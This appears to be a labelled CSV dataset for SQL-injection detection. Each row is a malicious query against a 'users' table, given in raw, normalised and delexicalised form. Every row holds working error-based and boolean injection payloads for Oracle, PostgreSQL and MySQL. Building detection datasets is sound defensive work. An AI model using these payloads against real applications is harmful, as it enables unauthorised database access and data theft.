payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"select * from users  WHERE username = ""1  )   as nbno where 9816  =  9816 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --"" or username = ""-6179   )    )    and username = ""1%\'   )    )    and    (    (   \'%\'  =  \'""","select * from users WHERE username = ""1 ) as nbno where 9816 = 9816 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-6179 ) ) and username = ""1%\' ) ) and ( ( \'%\' = \'""","select * from <TABLE> WHERE <COL> = <STR> or <COL> = <STR><NUM>%\<STR>%\<STR>""",1,False,,bccc
"select * from users  WHERE username = ""-8069\'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and username = ""1,  (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4250  =  4250  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ""","select * from users WHERE username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ""","select * from <TABLE> WHERE <COL> = <STR><NUM>, ( select upper ( xmltype ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) from dual ) """,1,False,,bccc
"select * from users  WHERE username = ""1\'  )   and   (  \'nxkp\' like \'nxkp"" and username = ""-5217 where 3620  =  3620","select * from users WHERE username = ""1\' ) and ( \'nxkp\' like \'nxkp"" and username = ""-5217 where 3620 = 3620","select * from <TABLE> WHERE <COL> = <STR> and <COL> = ""-<NUM> where <NUM> = <NUM>",1,False,,bccc
"select * from users  WHERE username = ""1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) "" and   (  \'rjjo\'  =  \'rjjo"" and username = ""1\'||  (  select \'ylio\' from dual where 3767  =  3767 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||\'""","select * from users WHERE username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and ( \'rjjo\' = \'rjjo"" and username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'""","select * from <TABLE> WHERE <COL> = <STR> and ( \<STR> = \<STR>|| ( select \<STR> from dual where <NUM> = <NUM> and <NUM> in ( ( char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) + ( select ( case when ( <NUM> = <NUM> ) then char ( <NUM> ) else char ( <NUM> ) end ) ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) ) ) ) ||\'""",1,True,,bccc
"select * from users  WHERE username = ""1\'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and username = ""-7430\'  )   as xfah where 1596  =  1596 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --""","select * from users WHERE username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from <TABLE> WHERE <COL> = <STR>,1,False,,bccc
"select * from users  WHERE username = ""1 and username = ""-3733\'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   \'ybgd\'  =  \'ybgd""","select * from users WHERE username = ""1 and username = ""-3733\' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'ybgd\' = \'ybgd""","select * from <TABLE> WHERE <COL> = <STR>-<NUM>\<STR>ybgd\<STR>ybgd""",1,False,,bccc
"select * from users  WHERE username = ""-7242\' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   or username = ""-8021\'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )","select * from users WHERE username = ""-7242\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-8021\' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","select * from <TABLE> WHERE <COL> = ""-<NUM>\<STR> ) ) or <NUM> = ctxsys.drithsx.sn ( <NUM>, ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) )",1,False,,bccc
"select * from users  WHERE username = ""1\'+  (  select \'rejz\' where 1530  =  1530 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +\'"" and username = ""-9501\'  )   and   (  \'mndw\'  =  \'mndw""","select * from users WHERE username = ""1\'+ ( select \'rejz\' where 1530 = 1530 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'"" and username = ""-9501\' ) and ( \'mndw\' = \'mndw""",select * from <TABLE> WHERE <COL> = <STR> and <COL> = <STR>,1,True,,bccc
"select * from users  WHERE username = ""1\'+  (  select sshu where 3442  =  3442 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +\'"" or username = ""1\'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )","select * from users WHERE username = ""1\'+ ( select sshu where 3442 = 3442 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) +\'"" or username = ""1\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","select * from <TABLE> WHERE <COL> = <STR> or <COL> = ""<NUM>\' ) ) ) and <NUM> = ctxsys.drithsx.sn ( <NUM>, ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) )",1,True,,bccc
"select * from users  WHERE username = ""-6519\'   )    )    as tdlt where 5040  =  5040 and username = ""1 where 8214  =  8214 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --""","select * from users WHERE username = ""-6519\' ) ) as tdlt where 5040 = 5040 and username = ""1 where 8214 = 8214 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""","select * from <TABLE> WHERE <COL> = <STR><NUM> where <NUM> = <NUM> and <NUM> = cast ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ::text|| ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) as numeric ) --""",1,False,,bccc
"select * from users  WHERE username = ""1\' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and username = ""1%\'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )","select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""1%\' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","select * from <TABLE> WHERE <COL> = ""<NUM>\<STR> ) ) ) and <NUM> = dbms_utility.sqlid_to_sqlhash ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) )",1,False,,bccc
"select * from users  WHERE username = ""-5313\'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   or username = ""1\'   )    )    as plbt where 4368  =  4368 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --""","select * from users WHERE username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1\' ) ) as plbt where 4368 = 4368 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from <TABLE> WHERE <COL> = <STR>,1,False,,bccc
"select * from users  WHERE username = ""-3978 or username = ""1%\'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  \'%\'  =  \'""","select * from users WHERE username = ""-3978 or username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'%\' = \'""","select * from <TABLE> WHERE <COL> = <STR><NUM>%\<STR>%\<STR>""",1,False,,bccc
"select * from users  WHERE username = ""1\'+  (  select onzd where 8452  =  8452 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +\'"" or username = ""-6792   )    )    as zlho where 4758  =  4758","select * from users WHERE username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" or username = ""-6792 ) ) as zlho where 4758 = 4758","select * from <TABLE> WHERE <COL> = <STR> or <COL> = ""-<NUM> ) ) as zlho where <NUM> = <NUM>",1,True,,bccc
"select * from users  WHERE username = ""1\'   )    )    as eltx where 9955  =  9955 or username = ""-4108\'  )   and   (  \'tqjx\'  =  \'tqjx""","select * from users WHERE username = ""1\' ) ) as eltx where 9955 = 9955 or username = ""-4108\' ) and ( \'tqjx\' = \'tqjx""",select * from <TABLE> WHERE <COL> = <STR>,1,False,,bccc
"select * from users  WHERE username = ""-5217 where 3620  =  3620 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --"" and username = ""1 where 8214  =  8214","select * from users WHERE username = ""-5217 where 3620 = 3620 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1 where 8214 = 8214","select * from <TABLE> WHERE <COL> = <STR> and <COL> = ""<NUM> where <NUM> = <NUM>",1,False,,bccc
"select * from users  WHERE username = ""1 or username = ""1  )   and username = ""-6523"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )","select * from users WHERE username = ""1 or username = ""1 ) and username = ""-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from <TABLE> WHERE <COL> = <STR><NUM> ) and <COL> = <STR> or <NUM> = ( select upper ( xmltype ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) from dual ),1,False,,bccc
"select * from users  WHERE username = ""1\'   )    )    as plbt where 4368  =  4368 or username = ""1\'  )   where 1502  =  1502 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --""","select * from users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 or username = ""1\' ) where 1502 = 1502 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from <TABLE> WHERE <COL> = <STR>,1,False,,bccc
"select * from users  WHERE username = ""1\'   )    )    or username = ""1  )   where 6039  =  6039 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --""","select * from users WHERE username = ""1\' ) ) or username = ""1 ) where 6039 = 6039 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""","select * from <TABLE> WHERE <COL> = <STR><NUM> ) where <NUM> = <NUM> and <NUM> = cast ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ::text|| ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) as numeric ) --""",1,False,,bccc
